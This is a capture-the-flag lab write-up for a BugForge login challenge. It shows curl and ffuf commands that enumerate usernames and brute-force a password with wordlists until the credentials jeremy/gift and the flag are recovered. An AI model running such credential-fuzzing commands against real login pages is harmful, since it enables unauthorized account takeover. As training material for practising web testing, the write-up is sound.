# Gift Lab — Passwords Are a Legacy Security Control...

## 1. Initial Login Attempt

The login endpoint was:

```text
https://lab-1788911927916-7q630n.labs-app.bugforge.io/login
```

Login credentials initially tested:

```text
username=fashil
password=password
```

The login request was:

```bash
curl -i -X POST \
  'https://lab-1788911927916-7q630n.labs-app.bugforge.io/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=fashil&password=password'
```

The login was successful and returned a JWT token with a redirect to:

```text
/dashboard
```

---

## 2. Checking the Kali Wordlist Directory

The wordlist directory was checked:

```bash
cd /usr/share/wordlists/
```

Then:

```bash
ls
```

The available wordlist included:

```text
rockyou.txt.gz
```

---

## 4. FFUF Username Fuzzing

FFUF was used to fuzz the username parameter:

```bash
ffuf -X POST \
  -d 'username=FUZZ&password=test' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u 'https://lab-1788911927916-7q630n.labs-app.bugforge.io/login' \
  -w xato-net-10-million-usernames.txt \
  -ac -t 100
```
We have found usernames:
```bash
jeremy
carlos
kevin
jenny
administrator
```
---

## 5. FFUF Password Fuzzing

Although 'adminsitrtor' could have more privileges, the username `jeremy` was tested while fuzzing the password parameter:

```bash
ffuf -X POST \
  -d 'username=jeremy&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u 'https://lab-1788911927916-7q630n.labs-app.bugforge.io/login' \
  -w /usr/share/wordlists/dirb/common.txt \
  -ac
```

The valid credentials discovered were:

```text
username: jeremy
password: gift
```

---

## 6. Successful Login

Using the discovered credentials:

```text
username=jeremy
password=gift
```

The login was successful and the application revealed the flag.

## Result

```text
Username: jeremy
Password: gift
```
